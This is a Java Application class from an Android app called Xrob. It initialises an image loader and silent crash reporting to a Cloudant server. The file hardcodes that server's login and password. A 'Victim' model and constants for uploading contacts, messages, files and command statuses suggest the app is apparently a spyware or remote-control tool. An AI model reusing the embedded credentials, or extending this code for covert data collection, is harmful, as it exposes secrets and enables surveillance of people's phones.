package com.theah64.xrob.utils;

import android.app.Application;
import android.content.Context;
import android.graphics.Bitmap;

import com.nostra13.universalimageloader.cache.disc.naming.Md5FileNameGenerator;
import com.nostra13.universalimageloader.core.DisplayImageOptions;
import com.nostra13.universalimageloader.core.ImageLoader;
import com.nostra13.universalimageloader.core.ImageLoaderConfiguration;
import com.nostra13.universalimageloader.core.assist.ImageScaleType;
import com.nostra13.universalimageloader.core.assist.QueueProcessingType;
import com.theah64.xrob.R;
import com.theah64.xrob.models.Victim;

import org.acra.ACRA;
import org.acra.ReportField;
import org.acra.ReportingInteractionMode;
import org.acra.annotation.ReportsCrashes;
import org.acra.sender.HttpSender;

/**
 * Created by theapache64 on 11/9/16.
 */
@ReportsCrashes(
        formUri = "https://xrob.cloudant.com/acra-xrob/_design/acra-storage/_update/report",
        reportType = HttpSender.Type.JSON,
        httpMethod = HttpSender.Method.POST,
        formUriBasicAuthLogin = "yeardstromenewhatheryini",
        formUriBasicAuthPassword = "95f101f733d693b4cdea21f27cfd3c5e34002735",
        customReportContent = {
                ReportField.APP_VERSION_CODE,
                ReportField.APP_VERSION_NAME,
                ReportField.ANDROID_VERSION,
                ReportField.PACKAGE_NAME,
                ReportField.REPORT_ID,
                ReportField.BUILD,
                ReportField.STACK_TRACE
        },
        mode = ReportingInteractionMode.SILENT
)
public class Xrob extends Application {

    public static final String KEY_ERROR = "error";
    public static final String KEY_MESSAGE = "message";
    public static final String KEY_DATA = "data";
    static final String KEY_ERROR_CODE = "error_code";
    public static final String KEY_DATA_TYPE = "data_type";
    public static final String DATA_TYPE_CONTACTS = "contacts";
    public static final String DATA_TYPE_COMMAND_STATUSES = "command_statuses";
    public static final String DATA_TYPE_FILES = "files";
    public static final String DATA_TYPE_MESSAGES = "messages";

    private static void initImageLoader(final Context context) {

        ImageLoaderConfiguration.Builder config = new ImageLoaderConfiguration.Builder(context);
        config.threadPriority(Thread.NORM_PRIORITY - 2);
        config.denyCacheImageMultipleSizesInMemory();

        final DisplayImageOptions defaultImageOption = new DisplayImageOptions.Builder()
                .cacheOnDisk(true)
                .considerExifParams(true)
                .imageScaleType(ImageScaleType.IN_SAMPLE_POWER_OF_2)
                .bitmapConfig(Bitmap.Config.RGB_565)
                .build();

        config.defaultDisplayImageOptions(defaultImageOption);

        config.diskCacheFileNameGenerator(new Md5FileNameGenerator());
        config.diskCacheSize(100 * 1024 * 1024); // 100 MiB
        config.tasksProcessingOrder(QueueProcessingType.LIFO);
        config.writeDebugLogs(); // Remove for release app

        // Initialize ImageLoader with configuration.
        ImageLoader.getInstance().init(config.build());
    }

    @Override
    protected void attachBaseContext(Context base) {
        super.attachBaseContext(base);
        ACRA.init(this);
    }

    @Override
    public void onCreate() {
        super.onCreate();
        initImageLoader(this);
    }
}
